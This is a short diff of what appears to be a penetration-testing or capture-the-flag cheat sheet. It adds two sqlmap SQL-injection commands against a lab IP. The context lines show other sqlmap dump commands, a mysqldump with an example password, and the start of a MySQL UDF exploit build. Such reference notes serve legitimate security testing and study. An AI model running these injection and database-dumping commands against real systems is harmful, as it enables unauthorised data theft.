@@ -52,6 +52,8 @@ mysqldump -u root -p Password123! --all-databases > all_db_backup.sql
 sqlmap.py -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2
 sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump
 sqlmap -r request.txt --dbms=mysql --dump
+sqlmap -u "http://192.168.1.100/section.php" --data "id=50&pass=1234" --dbs --threads 10 
+sqlmap -u "http://192.168.1.100/section.php?id=51" --sql-query="select * from users"
 
 # mysql (UDFs exploit):
 gcc -g -c raptor_udf2.c -fPIC
